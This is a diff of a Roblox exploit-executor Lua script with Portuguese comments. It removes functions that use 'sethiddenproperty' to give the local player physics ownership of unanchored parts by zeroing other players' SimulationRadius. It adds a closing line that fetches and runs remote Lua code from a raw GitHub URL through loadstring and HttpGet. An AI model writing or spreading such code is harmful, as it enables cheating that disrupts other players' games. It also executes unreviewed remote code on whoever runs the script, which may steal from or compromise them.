@@ -353,43 +353,6 @@ local function updateUnanchoredParts()
     end  
 end  
 
--- Função para aplicar SimulationRadius  
-local function enforceSimulationRadius()  
-    for _, player in ipairs(Players:GetPlayers()) do  
-        if player == localPlayer then  
-            sethiddenproperty(player, "SimulationRadius", 1000)  
-        else  
-            sethiddenproperty(player, "SimulationRadius", 0)  
-        end  
-    end  
-end  
-
--- Função para desativar NetworkSleeping  
-local function disableNetworkSleeping()  
-    for part, _ in pairs(unanchoredParts) do  
-        if part and part.Parent then  
-            -- Desativa NetworkSleeping apenas para partes próximas (raio de 1000 unidades)  
-            if (part.Position - rootPart.Position).Magnitude then  
-                sethiddenproperty(part, "NetworkIsSleeping", false)  
-            end  
-        else
-            unanchoredParts[part] = nil -- Remove a parte caso tenha sido deletada
-        end
-    end  
-end  
-
--- Atualiza a lista de partes não ancoradas a cada 3 segundos  
-task.spawn(function()  
-    while true do  
-        updateUnanchoredParts()  
-        task.wait(3)  
-    end  
-end)  
-
--- Aplica as configurações constantemente  
-RunService.Heartbeat:Connect(function()  
-    enforceSimulationRadius()  
-    disableNetworkSleeping()  
-end)
-
 task.wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
